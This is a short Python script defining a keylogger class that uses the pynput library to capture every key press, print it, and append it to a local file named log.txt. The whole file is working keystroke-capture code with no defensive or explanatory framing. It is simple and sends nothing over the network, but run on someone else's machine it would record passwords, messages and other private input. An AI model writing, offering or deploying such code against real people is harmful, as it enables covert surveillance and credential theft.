from pynput import keyboard

class KeyLogger():
    def __init__(self):
        self.file = "log.txt"

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.file, 'a') as f:
            f.write(self.get_char(key) + " ")

    def listen(self):
        listen = keyboard.Listener(on_press=self.on_press)
        listen.start()


if __name__ == '__main__':
    KeyLogger().listen()
    input()